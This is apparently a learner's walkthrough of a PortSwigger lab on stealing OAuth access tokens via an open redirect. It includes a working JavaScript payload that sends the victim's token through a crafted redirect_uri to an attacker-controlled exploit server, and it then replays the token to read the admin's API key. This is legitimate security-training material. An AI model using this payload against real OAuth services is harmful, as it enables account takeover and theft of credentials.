https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter


1) we have found that /post/next?path= URL has an open redirect vulnerability
2) we have found that https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1  allows us to be redirected to post 1
3) <script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>


this script allows us to steal the access token of the administrator. The idea is
    a) if it is the first time that the victim opens the /exploit page then we perform the request for an access token that redirects also on the /exploit page 
    b) when the request for the /exploit page comes from the redirect of the token if will contain the token in the parameters, so we get it and we redirect it also on /exploit page '/?'+document.location.hash.substr(1) gets the first parameter that is the acess token


Now we have the token but we need administrator info:

4) find the request GET /me and change the Authorization header with the one stolen (the access token)
